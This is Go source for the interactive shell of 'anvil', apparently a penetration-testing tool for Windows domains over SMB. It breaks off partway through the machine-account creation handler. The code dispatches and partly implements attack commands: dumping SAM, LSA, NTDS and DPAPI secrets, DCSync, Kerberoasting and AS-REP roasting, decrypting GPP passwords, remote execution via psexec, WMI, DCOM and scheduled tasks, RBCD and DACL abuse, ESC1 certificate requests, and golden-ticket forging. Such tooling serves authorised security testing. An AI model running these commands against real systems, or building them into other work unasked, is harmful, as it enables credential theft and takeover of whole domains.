// Package shell implements anvil's interactive SMB shell (cmd2-style) on
// top of a persistent smbclient.Session. Commands never reconnect; only a
// fatal transport error ends the session.
package shell

import (
	"bufio"
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"os"
	"path"
	"strconv"
	"strings"
	"time"
	"unicode/utf16"

	"github.com/chzyer/readline"
	"github.com/fatih/color"
	"github.com/mandiant/gopacket/pkg/dcerpc/winreg"
	"golang.org/x/term"

	"anvil/internal/adenum"
	"anvil/internal/dcsync"
	"anvil/internal/lsa"
	"anvil/internal/ntds"
	"anvil/internal/roast"
	"anvil/internal/sam"
	"anvil/internal/smbclient"
	"anvil/internal/track"
	"anvil/internal/ui"
)

// keepaliveInterval is the idle gap after which dispatch pings the session
// before running the next command (see dispatch's comment).
const keepaliveInterval = 5 * time.Minute

type shell struct {
	sess   *smbclient.Session
	rl     *readline.Instance
	shares []string // cached for tab completion
	groups []string // cached group names for `members` completion
	dead   bool     // set on fatal transport error; shell exits after the command

	tracker    *track.Tracker // write-op audit for `changes` and the exit banner
	rrRestore  func() error   // RemoteRegistry restore closure (ensureWinreg)
	history    []string       // typed lines, for `!<n>` re-execution
	bangDepth  int            // recursion guard for `!<n>`
	lastActive time.Time      // last command completed — drives the idle keepalive ping
	lootDirSet string         // session loot directory (set by `loot <dir>`; default resolved in lootDir)
}

// Run starts the interactive shell and returns the process exit code
// (0 clean exit, 1 connection lost). When stdin is not a terminal (scripted
// input), readline's raw-mode path is bypassed entirely — like gopacket's
// tools/smbclient, which uses a plain scanner for its -input-file mode —
// and lines are read verbatim.
func Run(sess *smbclient.Session) int {
	s := &shell{sess: sess, tracker: track.New(), lastActive: time.Now()}
	var code int
	if !term.IsTerminal(int(os.Stdin.Fd())) {
		code = s.runPiped(os.Stdin)
	} else {
		code = s.runInteractive()
	}
	s.shutdown()
	return code
}

// shutdown runs on every shell exit: restore the RemoteRegistry state if a
// winreg consumer changed it, and print the write-op audit summary.
func (s *shell) shutdown() {
	if s.rrRestore != nil {
		if err := s.rrRestore(); err != nil {
			ui.Warm.Printf("  warning: could not restore RemoteRegistry's prior state (%v) — it may have been left running\n", err)
		} else {
			ui.Faint.Println("  RemoteRegistry state restored")
		}
	}
	if s.tracker.Count() > 0 {
		fmt.Println()
		fmt.Println(s.tracker.Summary())
	}
}

// runPiped processes commands from a non-terminal stdin without prompts.
func (s *shell) runPiped(r io.Reader) int {
	sc := bufio.NewScanner(r)
	for sc.Scan() {
		args := splitArgs(sc.Text())
		if len(args) == 0 {
			continue
		}
		if code, done := s.dispatch(sc.Text(), args); done {
			return code
		}
	}
	return 0
}

func (s *shell) runInteractive() int {

	completer := readline.NewPrefixCompleter(
		readline.PcItem("help"),
		readline.PcItem("shares"),
		readline.PcItem("use", readline.PcItemDynamic(func(line string) []string { return s.shares })),
		readline.PcItem("ls"),
		readline.PcItem("cd"),
		readline.PcItem("pwd"),
		readline.PcItem("get"),
		readline.PcItem("put"),
		readline.PcItem("rm"),
		readline.PcItem("mkdir"),
		readline.PcItem("rmdir"),
		readline.PcItem("rename"),
		readline.PcItem("cat"),
		readline.PcItem("sessions"),
		readline.PcItem("users"),
		readline.PcItem("groups"),
		readline.PcItem("members", readline.PcItemDynamic(func(line string) []string { return s.groups })),
		readline.PcItem("services"),
		readline.PcItem("loggedon"),
		readline.PcItem("reg"),
		readline.PcItem("samdump"),
		readline.PcItem("lsadump"),
		readline.PcItem("dcsync"),
		readline.PcItem("ntdsdump"),
		readline.PcItem("dpapi"),
		readline.PcItem("kerberoast"),
		readline.PcItem("asrep"),
		readline.PcItem("adenum",
			readline.PcItem("users"),
			readline.PcItem("computers"),
			readline.PcItem("delegation"),
			readline.PcItem("laps"),
			readline.PcItem("adcs")),
		readline.PcItem("addcomputer"),
		readline.PcItem("delcomputer"),
		readline.PcItem("changepasswd"),
		readline.PcItem("sampasswd"),
		readline.PcItem("samadd"),
		readline.PcItem("samdel"),
		readline.PcItem("rbcd",
			readline.PcItem("get"),
			readline.PcItem("set"),
			readline.PcItem("clear")),
		readline.PcItem("dacledit"),
		readline.PcItem("owneredit"),
		readline.PcItem("lookupsid"),
		readline.PcItem("badsuccessor"),
		readline.PcItem("raisechild"),
		readline.PcItem("gpp"),
		readline.PcItem("exec"),
		readline.PcItem("psexec"),
		readline.PcItem("wmiexec"),
		readline.PcItem("wmiquery"),
		readline.PcItem("dcomexec"),
		readline.PcItem("svc"),
		readline.PcItem("tasks"),
		readline.PcItem("taskshow"),
		readline.PcItem("taskrun"),
		readline.PcItem("taskdel"),
		readline.PcItem("time"),
		readline.PcItem("portfwd"),
		readline.PcItem("procs"),
		readline.PcItem("find"),
		readline.PcItem("download"),
		readline.PcItem("eventlog"),
		readline.PcItem("enumpipes"),
		readline.PcItem("changes"),
		readline.PcItem("loot"),
		readline.PcItem("whoami"),
		readline.PcItem("trusts"),
		readline.PcItem("certreq"),
		readline.PcItem("ping"),
		readline.PcItem("reconnect"),
		readline.PcItem("exit"),
		readline.PcItem("quit"),
	)

	// No HistoryFile: in-memory history only, no cross-platform path
	// concerns.
	rl, err := readline.NewEx(&readline.Config{
		Prompt:          s.prompt(),
		AutoComplete:    completer,
		InterruptPrompt: "^C",
		EOFPrompt:       "exit",
	})
	if err != nil {
		ui.PrintErr(fmt.Sprintf("shell init: %v", err))
		return 1
	}
	defer rl.Close()
	s.rl = rl

	// Best-effort share cache for completion.
	if names, err := s.sess.ListShares(); err == nil {
		s.shares = names
	}

	for {
		rl.SetPrompt(s.prompt())
		line, err := rl.Readline()
		if err == readline.ErrInterrupt { // Ctrl+C: cancel line, keep session
			continue
		}
		if err != nil { // io.EOF (Ctrl+D) or exhausted pipe: clean exit
			return 0
		}

		args := splitArgs(line)
		if len(args) == 0 {
			continue
		}

		code, done := s.dispatch(line, args)
		if done {
			return code
		}
	}
}

// prompt renders the themed prompt: host/share in accent-alt, rest muted.
func (s *shell) prompt() string {
	host := ui.AccentAlt.Sprint(s.sess.Host())
	share := s.sess.Share()
	if share == "" {
		return ui.Muted.Sprint("anvil (") + host + ui.Muted.Sprint(") > ")
	}
	p := strings.ReplaceAll(s.sess.Path(), "/", "\\")
	if !strings.HasPrefix(p, "\\") {
		p = "\\" + p
	}
	return ui.Muted.Sprint("anvil (") + host + ui.Muted.Sprint(":") +
		ui.AccentAlt.Sprint(share) + ui.Muted.Sprintf(":%s) > ", p)
}

// dispatch executes one parsed command line. done=true ends the shell.
// line is the raw input; commands that forward text to the target (exec
// family, wmiquery) use rawRest — the verbatim remainder after the command
// word — because splitArgs strips quote characters that are data to the
// remote side (e.g. WQL string literals). Lines starting with `!` are the
// local-shell/history escape and never reach command handlers. Every line
// is appended to the in-memory history (for `!<n>`), and an idle gap over
// keepaliveInterval triggers a session liveness ping before the command —
// piggybacked on dispatch rather than a goroutine, so the SMB connection
// is never touched concurrently (a goroutine ping would race long-running
// commands like ntdsdump on the wire).
func (s *shell) dispatch(line string, args []string) (code int, done bool) {
	if strings.HasPrefix(line, "!") {
		s.cmdBang(line)
		return 0, false
	}
	if time.Since(s.lastActive) > keepaliveInterval {
		if err := s.sess.Ping(); err != nil {
			ui.Warm.Printf("  warning: session check failed (%v) — try reconnect\n", err)
		}
	}
	s.lastActive = time.Now()
	s.history = append(s.history, line)

	cmd := strings.ToLower(args[0])
	rest := args[1:]
	rawRest := ""
	if trimmed := strings.TrimSpace(line); len(trimmed) > len(args[0]) {
		rawRest = strings.TrimSpace(trimmed[len(args[0]):])
	}

	switch cmd {
	case "exit", "quit":
		return 0, true
	case "help":
		s.cmdHelp()
	case "shares":
		s.cmdShares()
	case "use":
		s.cmdUse(rest)
	case "ls":
		s.cmdLs(rest)
	case "cd":
		s.cmdCd(rest)
	case "pwd":
		s.cmdPwd()
	case "get":
		s.cmdGet(rest)
	case "put":
		s.cmdPut(rest)
	case "rm":
		s.cmdRm(rest)
	case "mkdir":
		s.cmdMkdir(rest)
	case "rmdir":
		s.cmdRmdir(rest)
	case "rename":
		s.cmdRename(rest)
	case "cat":
		s.cmdCat(rest)
	case "sessions":
		s.cmdSessions()
	case "users":
		s.cmdUsers()
	case "groups":
		s.cmdGroups()
	case "members":
		s.cmdMembers(rest)
	case "services":
		s.cmdServices()
	case "loggedon":
		s.cmdLoggedon()
	case "reg":
		s.cmdReg(rest)
	case "samdump":
		s.cmdSamdump(rest)
	case "lsadump":
		s.cmdLsadump(rest)
	case "dcsync":
		s.cmdDcsync(rest)
	case "ntdsdump":
		s.cmdNtdsdump(rest)
	case "dpapi":
		s.cmdDpapi()
	case "kerberoast":
		s.cmdKerberoast(rest)
	case "asrep":
		s.cmdAsrep(rest)
	case "adenum":
		s.cmdAdenum(rest)
	case "addcomputer":
		s.cmdAddComputer(rest)
	case "delcomputer":
		s.cmdDelComputer(rest)
	case "changepasswd":
		s.cmdChangePassword(rest)
	case "rbcd":
		s.cmdRBCD(rest)
	case "gpp":
		s.cmdGPP()
	case "exec":
		s.cmdExec(rawRest)
	case "psexec":
		s.cmdPSExec(rawRest)
	case "wmiexec":
		s.cmdWMIExec(rawRest)
	case "wmiquery":
		s.cmdWMIQuery(rawRest)
	case "dcomexec":
		s.cmdDCOMExec(rawRest)
	case "dacledit":
		s.cmdDACLEdit(rest)
	case "owneredit":
		s.cmdOwnerEdit(rest)
	case "sampasswd":
		s.cmdSAMPassword(rest)
	case "samadd":
		s.cmdSAMGroup(true, rest)
	case "samdel":
		s.cmdSAMGroup(false, rest)
	case "lookupsid":
		s.cmdLookupSid(rest)
	case "badsuccessor":
		s.cmdBadSuccessor(rest)
	case "raisechild":
		s.cmdRaiseChild(rest)
	case "svc":
		s.cmdSvc(rest)
	case "tasks", "taskshow", "taskrun", "taskdel":
		if cmd == "tasks" {
			s.cmdTasks(rest)
		} else {
			s.cmdTasks(append([]string{cmd}, rest...))
		}
	case "time":
		s.cmdTime()
	case "portfwd":
		s.cmdPortfwd(rest)
	case "procs":
		s.cmdProcs()
	case "find":
		s.cmdFind(rest)
	case "download":
		s.cmdDownload(rest)
	case "eventlog":
		s.cmdEventlog(rest)
	case "changes":
		s.cmdChanges(rest)
	case "enumpipes":
		s.cmdEnumPipes()
	case "ping":
		s.cmdPing()
	case "reconnect":
		s.cmdReconnect()
	case "loot":
		s.cmdLoot(rest)
	case "whoami":
		s.cmdWhoAmI()
	case "trusts":
		s.cmdTrusts()
	case "certreq":
		s.cmdCertreq(rest)
	default:
		ui.Warm.Printf("  unknown command %q — try help\n", cmd)
	}
	if s.dead {
		return 1, true
	}
	return 0, false
}

func (s *shell) cmdHelp() {
	rows := [][2]string{
		{"shares", "list available shares"},
		{"use <share>", "select a share (tree connect)"},
		{"ls [path]", "list remote directory"},
		{"cd <path>", "change remote directory"},
		{"pwd", "print remote working directory"},
		{"get <remote> [local]", "download a file"},
		{"put <local> [remote]", "upload a file"},
		{"rm <path>", "delete a remote file"},
		{"mkdir <path>", "create a remote directory"},
		{"rmdir <path>", "remove a remote directory"},
		{"rename <old> <new>", "rename/move a remote file"},
		{"cat <path>", "print a remote file (max 8 MiB)"},
		{"sessions", "list active sessions on the server (srvsvc)"},
		{"users", "list domain users (samr)"},
		{"groups", "list domain groups (samr)"},
		{"members <group>", "list members of a domain group (samr)"},
		{"services", "list Windows services (svcctl)"},
		{"loggedon", "list interactively logged-on users (wkssvc)"},
		{"reg query <key> [/v name]", "read remote registry (winreg)"},
		{"reg save <key> <file>", "export key to a file on the target (winreg)"},
		{"samdump", "dump local account NT/LM hashes (admin; winreg + hive download)"},
		{"lsadump", "dump LSA secrets + cached domain logons (admin; winreg + hive download)"},
		{"dcsync", "replicate domain user hashes from NTDS (admin; DRSUAPI over RPC/TCP)"},
		{"ntdsdump", "dump domain hashes offline from NTDS.dit (admin; VSS shadow copy + download)"},
		{"dpapi", "decrypt Credential Manager secrets via LSA masterkeys (admin)"},
		{"kerberoast", "request crackable TGS tickets for SPN users (LDAP + KDC)"},
		{"asrep", "request crackable AS-REPs for no-preauth users (LDAP + KDC)"},
		{"adenum [users|computers|delegation|laps|adcs]", "AD enumeration via LDAP (default: users)"},
		{"addcomputer <name> [-pass x]", "create a machine account (SAMR + LDAP attrs)"},
		{"delcomputer <name>", "delete a machine account (LDAP, admin)"},
		{"changepasswd <user> <new> [old]", "reset/change an AD user's password (LDAPS)"},
		{"rbcd get|set|clear ...", "read/set/clear RBCD on a computer (write: admin)"},
		{"gpp", "find + decrypt GPP cpasswords in SYSVOL"},
		{"exec <command...>", "run a command on the target via a scheduled task (admin; 15s output timeout)"},
		{"psexec <command...>", "run a command as SYSTEM via a temporary service (admin; svcctl)"},
		{"wmiexec <command...>", "run a command via WMI Win32_Process (admin; transient DCOM channel)"},
		{"wmiquery <WQL>", "run a WQL query via WMI/DCOM (admin)"},
		{"dcomexec <command...>", "run a command via DCOM objects (admin; often refused on hardened servers)"},
		{"lookupsid [startRID] [endRID]", "brute-force account names by RID over LSA (default 500-4000)"},
		{"dacledit <target> [-p user ...]", "read/grant/revoke DACL ACEs on an AD object (LDAP)"},
		{"owneredit <target> [-set user]", "read or set an AD object's owner (LDAP)"},
		{"sampasswd <user> <new> <old>", "change a user's password via SAMR (no LDAP; needs old password)"},
		{"samadd|samdel <group> <user>", "add/remove a group member via SAMR"},
		{"badsuccessor [enum|keys <dmsa$>]", "dMSA abuse (Server 2025 DCs; clean denial on older)"},
		{"raisechild <child-krbtgt-hash> [out]", "forge EA golden ticket via SIDHistory (child domains only)"},
		{"svc <start|stop|config> <name> [type]", "control Windows services (svcctl, admin)"},
		{"tasks|taskshow|taskrun|taskdel", "manage scheduled tasks (tsch)"},
		{"time", "server clock, zone, and uptime (srvsvc)"},
		{"reg set|delvalue|createkey|delkey", "write remote registry values/keys (winreg)"},
		{"reg search <root> <pattern>", "search registry keys/values (winreg)"},
		{"portfwd [list|add|remove|clear]", "PortProxy v4tov4 relay rules (registry)"},
		{"procs", "list processes via perf counters (no WMI)"},
		{"find [start] [filters]", "search the share (name/regex/size/mtime/depth/limit)"},
		{"download <remote> <local> [--resume] [--restart]", "resumable file download"},
		{"eventlog list|query <log> [filters]", "read Windows event logs (wevtutil)"},
		{"enumpipes", "list and categorize named pipes"},
		{"changes [--save] [--clear]", "write-op audit trail"},
		{"loot [dir]", "show/set the loot directory for --out files"},
		{"whoami", "session user, SID, and group memberships (LDAP + lsarpc)"},
		{"trusts", "list domain trust relationships (LDAP)"},
		{"certreq <template> [-san <upn>]", "request a certificate (MS-ICPR; ESC1)"},
		{"ping", "check session liveness"},
		{"reconnect", "re-dial and re-attach the share"},
		{"! <cmd> | !<n>", "run a local command / re-run history entry n"},
		{"exit, quit", "close the session"},
	}
	for _, r := range rows {
		fmt.Printf("  %s %s\n", fmt.Sprintf("%-22s", r[0]), ui.Muted.Sprint(r[1]))
	}
}

func (s *shell) cmdShares() {
	infos, err := s.sess.ProbeShares()
	if err != nil {
		s.opError(err)
		return
	}
	s.shares = s.shares[:0]
	for _, i := range infos {
		s.shares = append(s.shares, i.Name)
	}

	ui.Muted.Printf("  %-12s %-12s %s\n", "SHARE", "ACCESS", "NOTE")
	for _, i := range infos {
		var access string
		switch {
		case i.Read && i.Write:
			access = ui.Accent.Sprintf("%-12s", "READ, WRITE")
		case i.Read:
			access = fmt.Sprintf("%-12s", "READ ONLY")
		case i.Note == "pipe share":
			access = ui.Faint.Sprintf("%-12s", "—")
		default:
			access = ui.Warm.Sprintf("%-12s", "NO ACCESS")
		}

		note := i.Note
		if note != "" {
			note = ui.Faint.Sprint(note)
		}
		fmt.Printf("  %-12s %s %s\n", i.Name, access, note)
	}
}

func (s *shell) cmdUse(args []string) {
	if len(args) < 1 {
		fmt.Printf("  %s\n", ui.Muted.Sprint("usage: use <share>"))
		return
	}
	if err := s.sess.UseShare(args[0]); err != nil {
		s.opError(err)
	}
	// Success is silent: the prompt now shows the share.
}

func (s *shell) cmdLs(args []string) {
	if !s.requireShare() {
		return
	}
	dir := "."
	if len(args) > 0 {
		dir = strings.Join(args, " ")
	}
	files, err := s.sess.Ls(dir)
	if err != nil {
		// A path that is a file, not a directory: show the file itself.
		if fi, statErr := s.sess.Stat(dir); statErr == nil && !fi.IsDir() {
			ui.Muted.Printf("  %12s  %s\n", "SIZE", "NAME")
			fmt.Printf("  %12d  %s\n", fi.Size(), fi.Name())
			return
		}
		s.opError(err)
		return
	}
	ui.Muted.Printf("  %12s  %s\n", "SIZE", "NAME")
	for _, fi := range files {
		if fi.IsDir() {
			fmt.Printf("  %12s  %s\n", "-", fi.Name()+"/")
		} else {
			fmt.Printf("  %12d  %s\n", fi.Size(), fi.Name())
		}
	}
}

func (s *shell) cmdCd(args []string) {
	if !s.requireShare() {
		return
	}
	if len(args) < 1 {
		s.cmdPwd()
		return
	}
	if err := s.sess.Cd(strings.Join(args, " ")); err != nil {
		s.opError(err)
	}
}

func (s *shell) cmdPwd() {
	share := s.sess.Share()
	if share == "" {
		ui.PrintErr("no share selected — use <share> first")
		return
	}
	p := strings.ReplaceAll(s.sess.Path(), "/", "\\")
	if !strings.HasPrefix(p, "\\") {
		p = "\\" + p
	}
	fmt.Printf("  %s:%s\n", share, p)
}

func (s *shell) cmdGet(args []string) {
	if !s.requireShare() {
		return
	}
	if len(args) < 1 {
		fmt.Printf("  %s\n", ui.Muted.Sprint("usage: get <remote> [local]"))
		return
	}
	remote := args[0]
	local := path.Base(strings.ReplaceAll(remote, "\\", "/"))
	if len(args) > 1 {
		local = args[1]
	}

	n, elapsed, err := s.sess.Get(remote, local)
	if err != nil {
		s.opError(err)
		return
	}
	ui.Faint.Printf("  %s — %d bytes in %s\n", local, n, elapsed.Round(time.Millisecond))
}

func (s *shell) cmdPut(args []string) {
	if !s.requireShare() {
		return
	}
	if len(args) < 1 {
		fmt.Printf("  %s\n", ui.Muted.Sprint("usage: put <local> [remote]"))
		return
	}
	local := args[0]
	remote := path.Base(strings.ReplaceAll(local, "\\", "/"))
	if len(args) > 1 {
		remote = args[1]
	}

	n, elapsed, err := s.sess.Put(local, remote)
	s.trackOp(track.CategoryFile, "put", remote, fmt.Sprintf("%d bytes", n), err)
	if err != nil {
		s.opError(err)
		return
	}
	ui.Faint.Printf("  %s — %d bytes in %s\n", remote, n, elapsed.Round(time.Millisecond))
}

func (s *shell) cmdRm(args []string) {
	if !s.requireShare() {
		return
	}
	if len(args) < 1 {
		fmt.Printf("  %s\n", ui.Muted.Sprint("usage: rm <path>"))
		return
	}
	file := strings.Join(args, " ")
	err := s.sess.Rm(file)
	s.trackOp(track.CategoryFile, "rm", file, "", err)
	if err != nil {
		s.opError(err)
		return
	}
	ui.Faint.Printf("  deleted %s\n", file)
}

func (s *shell) cmdMkdir(args []string) {
	if !s.requireShare() {
		return
	}
	if len(args) < 1 {
		fmt.Printf("  %s\n", ui.Muted.Sprint("usage: mkdir <path>"))
		return
	}
	dir := strings.Join(args, " ")
	err := s.sess.Mkdir(dir)
	s.trackOp(track.CategoryFile, "mkdir", dir, "", err)
	if err != nil {
		s.opError(err)
		return
	}
	ui.Faint.Printf("  created %s\n", dir)
}

func (s *shell) cmdRmdir(args []string) {
	if !s.requireShare() {
		return
	}
	if len(args) < 1 {
		fmt.Printf("  %s\n", ui.Muted.Sprint("usage: rmdir <path>"))
		return
	}
	dir := strings.Join(args, " ")
	err := s.sess.Rmdir(dir)
	s.trackOp(track.CategoryFile, "rmdir", dir, "", err)
	if err != nil {
		s.opError(err)
		return
	}
	ui.Faint.Printf("  deleted %s\n", dir)
}

func (s *shell) cmdRename(args []string) {
	if !s.requireShare() {
		return
	}
	if len(args) < 2 {
		fmt.Printf("  %s\n", ui.Muted.Sprint("usage: rename <old> <new>"))
		return
	}
	err := s.sess.Rename(args[0], args[1])
	s.trackOp(track.CategoryFile, "rename", args[0], "-> "+args[1], err)
	if err != nil {
		s.opError(err)
		return
	}
	ui.Faint.Printf("  renamed %s -> %s\n", args[0], args[1])
}

func (s *shell) cmdCat(args []string) {
	if !s.requireShare() {
		return
	}
	if len(args) < 1 {
		fmt.Printf("  %s\n", ui.Muted.Sprint("usage: cat <path>"))
		return
	}
	content, err := s.sess.Cat(strings.Join(args, " "))
	if err != nil {
		s.opError(err)
		return
	}
	// Verbatim content, no decoration; keep the next prompt on its own line.
	fmt.Print(content)
	if !strings.HasSuffix(content, "\n") {
		fmt.Println()
	}
}

// requireShare gates commands that need a selected share.
func (s *shell) requireShare() bool {
	if s.sess.Share() == "" {
		ui.PrintErr("no share selected — use <share> first")
		return false
	}
	return true
}

// cmdSessions lists active sessions on the server (srvsvc NetrSessionEnum).
// Server-level op: needs no selected share.
func (s *shell) cmdSessions() {
	infos, err := s.sess.EnumSessions()
	if err != nil {
		s.opError(err)
		return
	}
	if len(infos) == 0 {
		ui.Faint.Println("  no sessions returned")
		return
	}
	ui.Muted.Printf("  %-20s %-18s %s\n", "USER", "SOURCE", "SESSION INFO")
	for _, si := range infos {
		fmt.Printf("  %-20s %-18s %s\n",
			si.Username, si.Source,
			ui.Faint.Sprintf("active %ds, idle %ds", si.ActiveTime, si.IdleTime))
	}
}

// cmdExec runs a single command on the target via a scheduled task (TSCH).
// Server-level op: needs no selected share. cmdLine is the verbatim
// remainder of the input line (see dispatch's rawRest).
func (s *shell) cmdExec(cmdLine string) {
	if cmdLine == "" {
		fmt.Printf("  %s\n", ui.Muted.Sprint("usage: exec <command...>"))
		return
	}
	out, warnings, err := s.sess.Exec(cmdLine)
	s.trackOp(track.CategoryExec, "exec", cmdLine, "", err)
	for _, w := range warnings {
		ui.Warm.Printf("  warning: %s\n", w)
	}
	if err != nil {
		s.opError(err)
		return
	}
	if out == "" {
		ui.Faint.Println("  (no output)")
		return
	}
	// Verbatim output; keep the next prompt on its own line.
	fmt.Print(out)
	if !strings.HasSuffix(out, "\n") {
		fmt.Println()
	}
}

// cmdGroups lists domain groups (SAMR). Server-level op: needs no selected
// share.
func (s *shell) cmdGroups() {
	groups, err := s.sess.EnumGroups()
	if err != nil {
		s.opError(err)
		return
	}
	s.groups = s.groups[:0]
	for _, g := range groups {
		s.groups = append(s.groups, g.Name)
	}
	ui.Muted.Printf("  %-6s %s\n", "RID", "NAME")
	for _, g := range groups {
		fmt.Printf("  %-6d %s\n", g.RID, g.Name)
	}
}

// cmdMembers lists members of one domain group (SAMR). Server-level op:
// needs no selected share.
func (s *shell) cmdMembers(args []string) {
	if len(args) < 1 {
		fmt.Printf("  %s\n", ui.Muted.Sprint("usage: members <groupname>"))
		return
	}
	name := strings.Join(args, " ")
	members, err := s.sess.EnumGroupMembers(name)
	if err != nil {
		s.opError(err)
		return
	}
	if len(members) == 0 {
		ui.Faint.Printf("  %s has no members\n", name)
		return
	}
	ui.Muted.Printf("  %-24s %s\n", "NAME", "RID")
	for _, m := range members {
		if m.Name == "" {
			fmt.Printf("  %s %d\n", ui.Faint.Sprintf("%-24s", "<unresolved>"), m.RID)
		} else {
			fmt.Printf("  %-24s %d\n", m.Name, m.RID)
		}
	}
}

// cmdServices lists Windows services (SVCCTL). Server-level op: needs no
// selected share.
func (s *shell) cmdServices() {
	svcs, err := s.sess.EnumServices()
	if err != nil {
		s.opError(err)
		return
	}
	ui.Muted.Printf("  %-30s %-12s %s\n", "NAME", "STATE", "DISPLAY NAME")
	for _, svc := range svcs {
		var state string
		switch svc.State {
		case "RUNNING":
			state = ui.Accent.Sprintf("%-12s", svc.State)
		case "STOPPED":
			state = ui.Faint.Sprintf("%-12s", svc.State)
		default:
			state = ui.Warm.Sprintf("%-12s", svc.State)
		}
		fmt.Printf("  %-30s %s %s\n", svc.Name, state, svc.DisplayName)
	}
	ui.Faint.Printf("  %d services\n", len(svcs))
}

// cmdLoggedon lists interactively logged-on users (wkssvc
// NetrWkstaUserEnum). Server-level op: needs no selected share.
func (s *shell) cmdLoggedon() {
	users, err := s.sess.EnumLoggedOn()
	if err != nil {
		s.opError(err)
		return
	}
	if len(users) == 0 {
		ui.Faint.Println("  no logged-on users returned")
		return
	}
	ui.Muted.Printf("  %-24s %-18s %s\n", "USER", "DOMAIN", "LOGON SERVER")
	for _, u := range users {
		server := u.LogonServer
		if server == "" {
			server = ui.Faint.Sprint("-")
		}
		fmt.Printf("  %-24s %-18s %s\n", u.Username, u.LogonDomain, server)
	}
}

// cmdKerberoast roasts SPN-bearing domain users: LDAP for the SPN lookup,
// KDC for the tickets — two transient channels, announced; the SMB session
// is untouched.
func (s *shell) cmdKerberoast(args []string) {
	out, bad := s.outPath(args)
	if bad {
		fmt.Printf("  %s\n", ui.Muted.Sprint("usage: kerberoast [--out <file>]"))
		return
	}
	ui.Faint.Println("  opening LDAP channel for SPN lookup")
	ui.Faint.Println("  requesting service tickets from KDC")

	_, dnsTree := s.sess.ServerInfo()
	hashes, warnings, err := roast.Kerberoast(s.sess.Host(), strings.ToUpper(dnsTree), s.sess.Creds())
	for _, w := range warnings {
		ui.Warm.Printf("  warning: %s\n", w)
	}
	if err != nil {
		s.opError(err)
		return
	}
	if len(hashes) == 0 {
		if len(warnings) > 0 {
			ui.Faint.Println("  SPN users found, but no tickets succeeded")
			return
		}
		ui.Faint.Println("  no SPN-bearing users found")
		return
	}
	lines := make([]string, 0, len(hashes))
	for _, h := range hashes {
		lines = append(lines, h.Line)
		fmt.Printf("%s\n", h.Line)
	}
	ui.Faint.Printf("  %d ticket hashes\n", len(hashes))
	if out != "" {
		s.writeLoot(out, "kerberoast "+s.sess.Host(), lines)
	}
}

// cmdAsrep roasts domain users with DONT_REQ_PREAUTH set: LDAP for the
// lookup, KDC for the AS-REPs — two transient channels, announced; the SMB
// session is untouched.
func (s *shell) cmdAsrep(args []string) {
	out, bad := s.outPath(args)
	if bad {
		fmt.Printf("  %s\n", ui.Muted.Sprint("usage: asrep [--out <file>]"))
		return
	}
	ui.Faint.Println("  opening LDAP channel for DONT_REQ_PREAUTH lookup")
	ui.Faint.Println("  requesting AS-REPs from KDC")

	_, dnsTree := s.sess.ServerInfo()
	hashes, warnings, err := roast.ASRep(s.sess.Host(), strings.ToUpper(dnsTree), s.sess.Creds())
	for _, w := range warnings {
		ui.Warm.Printf("  warning: %s\n", w)
	}
	if err != nil {
		s.opError(err)
		return
	}
	if len(hashes) == 0 {
		if len(warnings) > 0 {
			ui.Faint.Println("  no-preauth users found, but no AS-REPs succeeded")
			return
		}
		ui.Faint.Println("  no users with DONT_REQ_PREAUTH found")
		return
	}
	lines := make([]string, 0, len(hashes))
	for _, h := range hashes {
		lines = append(lines, h.Line)
		fmt.Printf("%s\n", h.Line)
	}
	ui.Faint.Printf("  %d AS-REP hashes\n", len(hashes))
	if out != "" {
		s.writeLoot(out, "asrep "+s.sess.Host(), lines)
	}
}

// cmdGPP finds and decrypts GPP cpasswords under SYSVOL (tree connect on
// the existing session, restored after).
func (s *shell) cmdGPP() {
	creds, warnings, err := s.sess.GppPasswords()
	for _, w := range warnings {
		ui.Warm.Printf("  warning: %s\n", w)
	}
	if err != nil {
		s.opError(err)
		return
	}
	if len(creds) == 0 {
		ui.Faint.Println("  no GPP passwords found in SYSVOL")
		return
	}
	ui.Muted.Printf("  %-24s %-24s %s\n", "USERNAME", "SECRET", "SOURCE")
	for _, c := range creds {
		fmt.Printf("  %-24s %-24s %s\n", c.User, ui.Accent.Sprint(c.Password), c.Source)
	}
	ui.Faint.Printf("  %d GPP passwords\n", len(creds))
}

// cmdRBCD reads, grants, or clears Resource-Based Constrained Delegation on
// a computer account (the msDS-AllowedToActOnBehalfOfOtherIdentity SD).
// One transient LDAP channel per op, announced.
func (s *shell) cmdRBCD(args []string) {
	if len(args) < 1 {
		s.rbcdUsage()
		return
	}
	ui.Faint.Println("  opening LDAP channel")

	switch strings.ToLower(args[0]) {
	case "get":
		if len(args) < 2 {
			s.rbcdUsage()
			return
		}
		target := args[1]
		entries, err := s.sess.GetRBCD(target)
		if err != nil {
			s.opError(err)
			return
		}
		if len(entries) == 0 {
			ui.Faint.Printf("  %s has no RBCD entries\n", target)
			return
		}
		ui.Muted.Printf("  %-24s %s\n", "ACCOUNT", "SID")
		for _, e := range entries {
			name := e.Name
			if name == "" {
				name = ui.Faint.Sprint("(unresolved)")
			}
			fmt.Printf("  %-24s %s\n", name, e.SID)
		}
	case "set":
		if len(args) < 3 {
			s.rbcdUsage()
			return
		}
		target, allowed := args[1], args[2]
		err := s.sess.SetRBCD(target, allowed)
		s.trackOp(track.CategoryAD, "rbcd set", target, allowed, err)
		if err != nil {
			s.opError(err)
			return
		}
		ui.Faint.Printf("  %s may now impersonate users on %s\n", allowed, target)
	case "clear":
		if len(args) < 2 {
			s.rbcdUsage()
			return
		}
		target := args[1]
		err := s.sess.ClearRBCD(target)
		s.trackOp(track.CategoryAD, "rbcd clear", target, "", err)
		if err != nil {
			s.opError(err)
			return
		}
		ui.Faint.Printf("  cleared RBCD on %s\n", target)
	default:
		s.rbcdUsage()
	}
}

func (s *shell) rbcdUsage() {
	fmt.Printf("  %s\n", ui.Muted.Sprint("usage: rbcd get <target> | rbcd set <target> <allowed> | rbcd clear <target>"))
}

// cmdAddComputer creates a machine account: SAMR create+password over the
// existing session, then dNSHostName/SPN attributes over one transient
// LDAP channel (announced).
func (s *shell) cmdAddComputer(args []string) {
	if len(args) < 1 {
		fmt.Printf("  %s\n", ui.Muted.Sprint("usage: addcomputer <name> [-pass <password>]"))
		return
	}
	name := args[0]

	password := ""
	for i := 1; i < len(args); i++ {
		if strings.EqualFold(args[i], "-pass") && i+1 < len(args) {
			password = args[i+1]
			i++
		}
	}
	generated := false
	if password == "" {
		password = randPassword(32)
		generated = true
	}

	ui.Faint.Println("  opening LDAP channel (attribute setup)")
	err := s.sess.AddComputer(name, password)
	s.trackOp(track.CategoryAD, "addcomputer", name+"$", "", err)
